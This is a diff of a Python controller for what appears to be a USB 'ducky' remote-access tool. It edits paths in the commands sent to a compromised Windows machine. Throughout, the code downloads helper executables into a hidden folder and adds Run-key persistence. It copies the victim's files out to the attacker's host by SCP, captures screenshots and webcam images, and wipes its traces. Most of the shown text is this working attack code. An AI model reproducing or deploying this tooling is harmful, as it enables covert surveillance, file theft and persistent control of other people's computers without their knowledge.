@@ -60,7 +60,8 @@ else:
     if sys.platform[:5] == "linux" or sys.platform == "darwin":
         attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
     elif sys.platform == "win32":
-        attacker_ip = os.popen("ipconfig").readlines()[0].strip().split(": ")[1]
+        ipconfig = os.popen("ipconfig").readlines()
+        attacker_ip = [x.split(": ")[1].strip() for x in ipconfig if "IPv4" in x][0]
     else:
         print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
         attacker_ip = input("Manual entry is required >> ")
@@ -112,13 +113,13 @@ print("Elevated Powershell:   " + elevation)
 conn.send("$env:OS\n".encode())
 operating_system = conn.recv(1024).decode().split("\n")[0]
 print("Operating System:      " + operating_system)
-conn.send("cd $env:userprofile/Documents; rm -r z; mkdir z; attrib +h z; cd z".encode())
+conn.send("cd $env:userprofile; rm -r z; mkdir z; attrib +h z; cd z".encode())
 conn.recv(1024)
-conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/pscp.exe\" \"$env:userprofile//z/pscp.exe\"".encode())
 conn.recv(1024)
-conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/screenshot.ps1\" \"$env:userprofile/Documents/z/screenshot.ps1\"; . .\screenshot.ps1".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/screenshot.ps1\" \"$env:userprofile/z/screenshot.ps1\"; . .\screenshot.ps1".encode())
 conn.recv(1024)
-conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/CommandCam.exe\" \"$env:userprofile/Documents/z/webcam.exe\"".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/CommandCam.exe\" \"$env:userprofile/z/webcam.exe\"".encode())
 conn.recv(1024)
 conn.send("cd $env:userprofile".encode())
 threading.Thread(target=recv, args=(conn,)).start()
@@ -223,10 +224,10 @@ while not stop:
             commands = []
             if "-d" in options:
                 commands.append("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /f")
-                commands.append("rm $env:userprofile/Documents/z/persistence.bat")
+                commands.append("rm $env:userprofile/z/persistence.bat")
             else:
-                commands.append("df \"https://raw.githubusercontent.com/computer-geek64/ducky/master/persistence.bat\" \"$env:userprofile\\Documents\\z\\persistence.bat\"")
-                commands.append("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /d \"$env:userprofile\\Documents\\z\\persistence.bat\" /t REG_SZ")
+                commands.append("df \"https://raw.githubusercontent.com/computer-geek64/ducky/master/persistence.bat\" \"$env:userprofile\\z\\persistence.bat\"")
+                commands.append("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /d \"$env:userprofile\\z\\persistence.bat\" /t REG_SZ")
             stdin = "; ".join(commands)
         elif ducky_command[:13] == "reverse_shell":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -241,10 +242,10 @@ while not stop:
             commands = []
             if ducky_command[7:9] == "-r":
                 filename = ducky_command[10:]
-                commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_port + " -pw '" + getpass("Password >> ") + "' -scp -r " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_ip + ":" + os.getcwd() + "/scp")
+                commands.append("echo y | & $env:userprofile/z/pscp.exe -P " + ssh_port + " -pw '" + getpass("Password >> ") + "' -scp -r " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_ip + ":" + os.getcwd() + "/scp")
             else:
                 filename = ducky_command[7:]
-                commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_port + " -pw '" + getpass("Password >> ") + "' -scp " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_ip + ":" + os.getcwd() + "/scp")
+                commands.append("echo y | & $env:userprofile/z/pscp.exe -P " + ssh_port + " -pw '" + getpass("Password >> ") + "' -scp " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_ip + ":" + os.getcwd() + "/scp")
             stdin = "; ".join(commands)
         elif ducky_command[:8] == "rickroll":
             commands = []
@@ -304,8 +305,8 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:7] == "cleanup":
             commands = []
-            commands.append("attrib -h $env:userprofile/Documents/z")
-            commands.append("rm -r $env:userprofile/Documents/z")
+            commands.append("attrib -h $env:userprofile/z")
+            commands.append("rm -r $env:userprofile/z")
             commands.append("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /f")
             stdin = "; ".join(commands)
         elif ducky_command[:4] == "size":
@@ -314,19 +315,22 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:10] == "screenshot":
             commands = []
-            commands.append("screenshot -screen -file \"$env:userprofile/Documents/z/image.png\" -imagetype png")
+            commands.append("screenshot -screen -file \"$env:userprofile/z/image.png\" -imagetype png")
             stdin = "; ".join(commands)
         elif ducky_command[:11] == "webcam_list":
             commands = []
-            commands.append("& \"$env:userprofile/Documents/z/webcam.exe\" /devlist")
+            commands.append("$a = [string] (& \"$env:userprofile/z/webcam.exe\" /devlist 2>&1) -split \'\\n\'")
+            commands.append("$a[10..($a.count - 2)]")
+            commands.append("remove-variable a")
             stdin = "; ".join(commands)
+            conn.recv(1024).decode()
         elif ducky_command[:11] == "webcam_snap":
             options = [x for x in ducky_command.split(" ")[1:] if x]
             commands = []
             if len(options) > 0:
-                commands.append("& \"$env:userprofile/Documents/z/webcam.exe\" /filename \"$env:userprofile/Documents/z/webcam.bmp\" /devnum " + options[0])
+                commands.append("& \"$env:userprofile/z/webcam.exe\" /filename \"$env:userprofile/z/webcam.bmp\" /devnum " + options[0])
             else:
-                commands.append("& \"$env:userprofile/Documents/z/webcam.exe\" /filename \"$env:userprofile/Documents/z/webcam.bmp\"")
+                commands.append("& \"$env:userprofile/z/webcam.exe\" /filename \"$env:userprofile/z/webcam.bmp\"")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
